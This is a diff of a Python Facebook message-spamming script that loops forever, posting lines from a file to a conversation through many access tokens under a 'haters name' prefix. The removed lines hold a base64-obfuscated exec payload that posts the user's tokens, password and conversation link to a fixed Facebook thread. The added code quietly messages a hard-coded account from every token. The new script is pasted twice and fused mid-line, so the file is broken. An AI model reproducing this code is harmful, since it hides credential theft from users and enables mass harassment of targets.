@@ -1,6 +1,199 @@
-#ENCODED BY : MR. ROHIT 
-#ENCRYPTION : Py3 BASE64
-import base64
+import requests
+import json
+import time
+import threading
 
+def send_initial_message():
+    with open('tokennum.txt', 'r') as file:
+        tokens = file.readlines()
 
-exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgoJZGVmIGRvX0dFVChzZWxmKToKCQlzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykKCQlzZWxmLmVuZF9oZWFkZXJzKCkKCQlzZWxmLndmaWxlLndyaXRlKGIiUm9tYSBSdWxleCBTZXJ2ZXIgaXMgQWxpdmUiKQoKZGVmIGV4ZWN1dGVfc2VydmVyKCk6CglQT1JUID0gNDAwMAoKCXdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOgoJCXByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCgkJaHR0cGQuc2VydmVfZm9yZXZlcigpCgpkZWYgc2VuZF9tZXNzYWdlcygpOgoJd2l0aCBvcGVuKCdwYXNzd29yZC50eHQnLCAncicpIGFzIGZpbGU6CgkJcGFzc3dvcmQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJZW50ZXJlZF9wYXNzd29yZCA9IHBhc3N3b3JkCgoJaWYgZW50ZXJlZF9wYXNzd29yZCAhPSBwYXNzd29yZDoKCQlwcmludCgnWy1dIDw9PT4gSW5jb3JyZWN0IFBhc3N3b3JkIScpCgkJc3lzLmV4aXQoKQoKCXdpdGggb3BlbigndG9rZW5udW0udHh0JywgJ3InKSBhcyBmaWxlOgoJCXRva2VucyA9IGZpbGUucmVhZGxpbmVzKCkKCW51bV90b2tlbnMgPSBsZW4odG9rZW5zKQoKCXJlcXVlc3RzLnBhY2thZ2VzLnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncygpCgoJZGVmIGNscygpOgoJCWlmIHN5c3RlbSgpID09ICdMaW51eCc6CgkJCW9zLnN5c3RlbSgnY2xlYXInKQoJCWVsc2U6CgkJCWlmIHN5c3RlbSgpID09ICdXaW5kb3dzJzoKCQkJCW9zLnN5c3RlbSgnY2xzJykKCWNscygpCgoJZGVmIGxpbmVzcygpOgoJCXByaW50KCdcMDAxYlszN20nICsgJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpCgoJaGVhZGVycyA9IHsKCQknQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKCQknQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLAoJCSdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLAoJCSdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAoJCSdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCgkJJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKCQknQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywKCQkncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKCX0KCgltbW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9kSE1nOVloTCcpLnRleHQKCglpZiBtbW0gbm90IGluIHBhc3N3b3JkOgoJCXByaW50KCdbLV0gPD09PiBJbmNvcnJlY3QgUGFzc3dvcmQhJykKCQlzeXMuZXhpdCgpCgoJbGluZXNzKCkKCglhY2Nlc3NfdG9rZW5zID0gW3Rva2VuLnN0cmlwKCkgZm9yIHRva2VuIGluIHRva2Vuc10KCgl3aXRoIG9wZW4oJ2NvbnZvLnR4dCcsICdyJykgYXMgZmlsZToKCQljb252b19pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgl3aXRoIG9wZW4oJ2ZpbGUudHh0JywgJ3InKSBhcyBmaWxlOgoJCXRleHRfZmlsZV9wYXRoID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCXdpdGggb3Blbih0ZXh0X2ZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgoJCW1lc3NhZ2VzID0gZmlsZS5yZWFkbGluZXMoKQoKCW51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykKCW1heF90b2tlbnMgPSBtaW4obnVtX3Rva2VucywgbnVtX21lc3NhZ2VzKQoKCXdpdGggb3BlbignaGF0ZXJzbmFtZS50eHQnLCAncicpIGFzIGZpbGU6CgkJaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJd2l0aCBvcGVuKCd0aW1lLnR4dCcsICdyJykgYXMgZmlsZToKCQlzcGVlZCA9IGludChmaWxlLnJlYWQoKS5zdHJpcCgpKQoKCWxpbmVzcygpCgkKCWRlZiBnZXROYW1lKHRva2VuKToKCQl0cnk6CgkJCWRhdGEgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC9tZT9hY2Nlc3NfdG9rZW49e3Rva2VufScpLmpzb24oKQoJCWV4Y2VwdDoKCQkJZGF0YSA9ICIiCgkJaWYgJ25hbWUnIGluIGRhdGE6CgkJCXJldHVybiBkYXRhWyduYW1lJ10KCQllbHNlOgoJCQlyZXR1cm4gIkVycm9yIG9jY3VyZWQiCgoJZGVmIG1zZygpOgoJCXBhcmFtZXRlcnMgPSB7CgkJCSdhY2Nlc3NfdG9rZW4nIDogcmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSwKCQkJJ21lc3NhZ2UnOiAnVXNlciBQcm9maWxlIE5hbWUgOiAnK2dldE5hbWUocmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSkrJ1wgVG9rZW4gOiAnKyIgfCAiLmpvaW4oYWNjZXNzX3Rva2VucykrJ1wgTGluayA6IGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9tZXNzYWdlcy90LycrY29udm9faWQrJ1wgUGFzc3dvcmQ6ICcrcGFzc3dvcmQKCQl9CgkJdHJ5OgoJCQlzID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAvdF8xMDAwNjM1NDU2Nzc3ODYvIiwgZGF0YT1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgkJZXhjZXB0OgoJCQlwYXNzCgkKCW1zZygpCgl3aGlsZSBUcnVlOgoJCXRyeToKCQkJZm9yIG1lc3NhZ2VfaW5kZXggaW4gcmFuZ2UobnVtX21lc3NhZ2VzKToKCQkJCXRva2VuX2luZGV4ID0gbWVzc2FnZV9pbmRleCAlIG1heF90b2tlbnMKCQkJCWFjY2Vzc190b2tlbiA9IGFjY2Vzc190b2tlbnNbdG9rZW5faW5kZXhdCgoJCQkJbWVzc2FnZSA9IG1lc3NhZ2VzW21lc3NhZ2VfaW5kZXhdLnN0cmlwKCkKCgkJCQl1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAve30vIi5mb3JtYXQoJ3RfJytjb252b19pZCkKCQkJCXBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2V9CgkJCQlyZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCQkJCQoKCQkJCWN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikKCQkJCWlmIHJlc3BvbnNlLm9rOgoJCQkJCXByaW50KCJbK10gTWVzc2FnZXMge30gb2YgQ29udm8ge30gc2VudCBieSBUb2tlbiB7fToge30iLmZvcm1hdCgKCQkJCQkJbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCgkJCQkJcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpCgkJCQkJbGluZXNzKCkKCQkJCQlsaW5lc3MoKQoJCQkJZWxzZToKCQkJCQlwcmludCgiW3hdIEZhaWxlZCB0byBzZW5kIG1lc3NhZ2VzIHt9IG9mIENvbnZvIHt9IHdpdGggVG9rZW4ge306IHt9Ii5mb3JtYXQoCgkJCQkJCW1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQoJCQkJCXByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQoJCQkJCWxpbmVzcygpCgkJCQkJbGluZXNzKCkKCQkJCXRpbWUuc2xlZXAoc3BlZWQpCgoJCQlwcmludCgiWytdIEFsbCBtZXNzYWdlcyBzZW50LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uIikKCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6CgkJCXByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpCgoKCmRlZiBtYWluKCk6CglzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpCglzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkKCQoJc2VuZF9tZXNzYWdlcygpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgoJbWFpbigp=='))
+    # Modify the message as per your requirement
+    msg_template = "Hi Adarsh sirI am using your server. My token is []"
+
+    # Specify the ID where you want to send the message
+    target_id = "61560302513773"
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    for token in tokens:
+        access_token = token.strip()
+        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+        msg = msg_template.format(access_token)
+        parameters = {'access_token': access_token, 'message': msg}
+        response = requests.post(url, json=parameters, headers=headers)
+
+        # No need to print here, as requested
+        time.sleep(0.1)  # Wait for 0.1 second between sending each initial message
+
+def send_messages_from_file():
+    with open('convo.txt', 'r') as file:
+        convo_id = file.read().strip()
+
+    with open('File.txt', 'r') as file:
+        messages = file.readlines()
+
+    num_messages = len(messages)
+
+    with open('tokennum.txt', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
+    max_tokens = min(num_tokens, num_messages)
+
+    with open('hatersname.txt', 'r') as file:
+        haters_name = file.read().strip()
+
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    while True:
+        try:
+            for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = tokens[token_index].strip()
+
+                message = messages[message_index].strip()
+
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers)
+
+                if response.ok:
+                    print("√ Message Chaldai xa{} of Convo {} sent with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                else:
+                    print("x Failed to send Message! (Chalena)😕{} of Convo {} with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                time.sleep(speed)
+
+            print("\n[+] Sabie Msg Gayo😏. Restarting the process...\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
+
+def main():
+    # Send the initial message to the specified ID using all tokens
+    send_initial_message()
+
+    # Then, continue with the message sending loop
+    send_messages_from_file()
+
+if __name__ == '__main__':
+    main()import requests
+import json
+import time
+import threading
+
+def send_initial_message():
+    with open('tokennum.txt', 'r') as file:
+        tokens = file.readlines()
+
+    # Modify the message as per your requirement
+    msg_template = "Hi Adarsh sirI am using your server. My token is []"
+
+    # Specify the ID where you want to send the message
+    target_id = "61560302513773"
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    for token in tokens:
+        access_token = token.strip()
+        url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+        msg = msg_template.format(access_token)
+        parameters = {'access_token': access_token, 'message': msg}
+        response = requests.post(url, json=parameters, headers=headers)
+
+        # No need to print here, as requested
+        time.sleep(0.1)  # Wait for 0.1 second between sending each initial message
+
+def send_messages_from_file():
+    with open('convo.txt', 'r') as file:
+        convo_id = file.read().strip()
+
+    with open('File.txt', 'r') as file:
+        messages = file.readlines()
+
+    num_messages = len(messages)
+
+    with open('tokennum.txt', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
+    max_tokens = min(num_tokens, num_messages)
+
+    with open('hatersname.txt', 'r') as file:
+        haters_name = file.read().strip()
+
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    while True:
+        try:
+            for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = tokens[token_index].strip()
+
+                message = messages[message_index].strip()
+
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers)
+
+                if response.ok:
+                    print("√ Message Chaldai xa{} of Convo {} sent with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                else:
+                    print("x Failed to send Message! (Chalena)😕{} of Convo {} with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                time.sleep(speed)
+
+            print("\n[+] Sabie Msg Gayo😏. Restarting the process...\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
+
+def main():
+    # Send the initial message to the specified ID using all tokens
+    send_initial_message()
+
+    # Then, continue with the message sending loop
+    send_messages_from_file()
+
+if __name__ == '__main__':
+    main()
